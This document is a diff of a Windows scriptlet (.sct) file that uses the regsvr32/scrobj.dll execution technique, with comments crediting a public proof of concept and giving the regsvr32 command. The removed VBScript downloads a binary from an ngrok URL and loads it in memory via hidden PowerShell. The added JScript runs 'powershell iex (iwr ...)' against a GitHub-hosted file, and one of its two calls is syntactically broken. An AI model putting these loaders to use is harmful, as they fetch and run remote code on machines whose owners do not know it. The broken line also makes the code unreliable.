@@ -1,44 +1,44 @@
-<?xml version="1.0"?>
-
-<?xml version="1.0"?>
+<?XML version="1.0"?>
 <scriptlet>
-    <registration
-        progid="MyScriptlet"
-        classid="{AAAA1111-0000-0000-0000-ABCDEF123456}">
-        <script language="VBScript">
-            <![CDATA[
-                Dim objShell, objHTTP, objStream, strURL, strTempPath, objFSO, strTempFile
 
-                ' URL to the binary payload
-                strURL = "https://immune-gopher-finer.ngrok-free.app/raw.bin" ' <-- Replace with your URL
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+	>
 
-                ' Create an XMLHTTP object to download the file
-                Set objHTTP = CreateObject("MSXML2.XMLHTTP")
-                objHTTP.Open "GET", strURL, False
-                objHTTP.Send
+	<!-- regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+	<!-- DFIR -->
+	<!--		.sct files are downloaded and executed from a path like this -->
+	<!-- Though, the name and extension are arbitary.. -->
+	<!-- c:\users\USER\appdata\local\microsoft\windows\temporary internet files\content.ie5\2vcqsj3k\file[2].sct -->
+	<!-- Based on current research, no registry keys are written, since call "uninstall" -->
 
-                ' Check if the HTTP request was successful (Status 200)
-                If objHTTP.Status = 200 Then
-                    ' Get the temporary directory path
-                    Set objFSO = CreateObject("Scripting.FileSystemObject")
-                    strTempPath = objFSO.GetSpecialFolder(2) ' Temporary folder path
 
-                    ' Define the temporary file path
-                    strTempFile = strTempPath & "\" & objFSO.GetTempName()
+	<!-- Proof Of Concept - Casey Smith @subTee --> 
+        <!-- @RedCanary - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/atomic-dev-cs/Windows/Payloads/mshta.sct -->
+	<script language="JScript">
+		<![CDATA[
 
-                    ' Create a stream to save the binary data
-                    Set objStream = CreateObject("ADODB.Stream")
-                    objStream.Type = 1 ' Binary data
-                    objStream.Open
-                    objStream.Write objHTTP.responseBody
-                    objStream.SaveToFile strTempFile, 2 ' Save the binary data to a file
-                    objStream.Close
+			var r = new ActiveXObject("WScript.Shell").Run ("powershell.exe iex (iwr 'https://raw.githubusercontent.com/deux1337/cyberdeux/refs/heads/main/DISTINCTIVE_MATH.dll')0, false);
 
-                    ' Execute the binary file using PowerShell (in memory)
-                    Set objShell = CreateObject("WScript.Shell")
-                    objShell.Run "powershell -nop -w hidden -c ""[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('" & strTempFile & "')).EntryPoint.Invoke($null, $null)""", 0, False
-                End If
-            ]]>
-        </script>
-    </registration>
+		]]>
+	</script>
+</registration>
+
+<public>
+    <method name="Exec"></method>
+</public>
+<script language="JScript">
+<![CDATA[
+
+	function Exec()
+	{
+		var r = new ActiveXObject("WScript.Shell").Run("powershell.exe iex (iwr 'https://raw.githubusercontent.com/deux1337/cyberdeux/refs/heads/main/DISTINCTIVE_MATH.dll')", 0, false);
+	}
+
+]]>
+</script>
+
 </scriptlet>
